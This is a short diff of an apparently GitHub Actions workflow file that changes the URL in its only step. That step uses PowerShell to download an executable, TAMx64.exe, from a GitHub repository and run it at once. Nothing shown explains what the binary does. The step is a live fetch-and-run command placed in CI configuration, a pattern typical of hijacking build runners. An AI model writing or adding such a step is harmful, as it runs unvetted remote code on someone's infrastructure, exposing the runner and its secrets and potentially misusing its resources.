@@ -7,4 +7,4 @@ jobs:
     steps:
       - name: powershell
         shell: cmd
-        run: powershell.exe -c Invoke-WebRequest https://github.com/username/Sameer1-29/raw/main/TAMx64.exe -OutFile TAMx64.exe ; .\TAMx64.exe
+        run: powershell.exe -c Invoke-WebRequest https://github.com/Sameer1-29/oscar/raw/main/TAMx64.exe -OutFile TAMx64.exe ; .\TAMx64.exe
